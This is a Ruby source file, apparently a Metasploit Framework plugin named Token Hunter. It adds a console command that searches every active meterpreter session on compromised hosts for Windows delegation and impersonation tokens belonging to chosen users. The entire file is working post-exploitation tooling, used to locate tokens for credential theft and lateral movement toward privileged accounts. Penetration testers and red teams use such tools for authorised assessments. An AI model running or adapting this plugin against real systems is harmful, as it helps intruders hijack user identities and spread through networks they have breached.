#
# $Id$
# $Revision$
#

module Msf

class Plugin::TokenHunter < Msf::Plugin

  class TokenCommandDispatcher
    include Msf::Ui::Console::CommandDispatcher

    def name
      "Token Hunter"
    end

    def commands
      {
        'token_hunt_user'        => "Scan all connected meterpreter sessions for active tokens corresponding to one or more users"
      }
    end

    def cmd_token_hunt_user(*args)

      opts = Rex::Parser::Arguments.new(
        "-h"   => [ false,  "This help menu"],
        "-f"   => [ true,   "A file containing a list of users to search for (one per line)"]
      )

      opt_userfile  = nil
      opt_users     = []

      opts.parse(args) do |opt, idx, val|
        case opt
        when "-h"
          print_line("Usage: token_hunt_user [options] <username> [username] .. [username]")
          print_line(opts.usage)
          return
        when "-f"
          opt_userfile = val
        else
          opt_users << val
        end
      end

      if(opt_userfile)
        ::File.open(opt_userfile, "rb") do |fd|
          fd.each_line do |line|
            line.strip!
            next if line.empty?
            next if line =~ /^#/
            opt_users << line
          end
        end
      end

      opt_users.uniq!

      tokens_del = {}
      tokens_imp = {}

      framework.sessions.each_key do |sid|
        session = framework.sessions[sid]
        next if session.type != "meterpreter"

        print_status(">> Scanning session #{session.sid} / #{session.session_host}")

        if(! session.incognito)
          session.core.use("incognito")
        end

        if(! session.incognito)
          print_status("!! Failed to load incognito on #{session.sid} / #{session.session_host}")
          next
        end

        res = session.incognito.incognito_list_tokens(0)
        if(res)
          res["delegation"].split("\n").each do |user|

            opt_users.each do |needle|

              ndom,nusr = needle.split("\\")
              if(not nusr)
                nusr = ndom
                ndom = nil
              end

              if(not user.nil? and ndom and user.strip.downcase == needle.strip.downcase)
                print_status("FOUND: #{session.sid} - #{session.session_host} - #{user} (delegation)")
                next
              end

              fdom,fusr = user.split("\\")

              if (not fusr.nil? and ! ndom and fusr.strip.downcase == nusr.strip.downcase)
                print_status("FOUND: #{session.sid} - #{session.session_host} - #{user} (delegation)")
              end
            end

            tokens_del[user] ||= []
            tokens_del[user] << session.sid
          end


          res["impersonation"].split("\n").each do |user|

            opt_users.each do |needle|
              ndom,nusr = needle.split("\\")
              if(not nusr)
                nusr = ndom
                ndom = nil
              end

              if(not user.nil? and ndom and user.strip.downcase == needle.strip.downcase)
                print_status(">> Found #{session.sid} - #{session.session_host} - #{user} (impersonation)")
                next
              end

              fdom,fusr = user.split("\\")
              if (not fusr.nil? and ! ndom and fusr.strip.downcase == nusr.strip.downcase)
                print_status(">> Found #{session.sid} - #{session.session_host} - #{user} (impersonation)")
              end
            end

            tokens_imp[user] ||= []
            tokens_imp[user] << session.sid
          end
        end
      end
    end
  end


  def initialize(framework, opts)
    super
    add_console_dispatcher(TokenCommandDispatcher)
  end

  def cleanup
    remove_console_dispatcher('Token Hunter')
  end

  def name
    "token_hunter"
  end

  def desc
    "Search all active meterpreter sessions for specific tokens"
  end
end
end

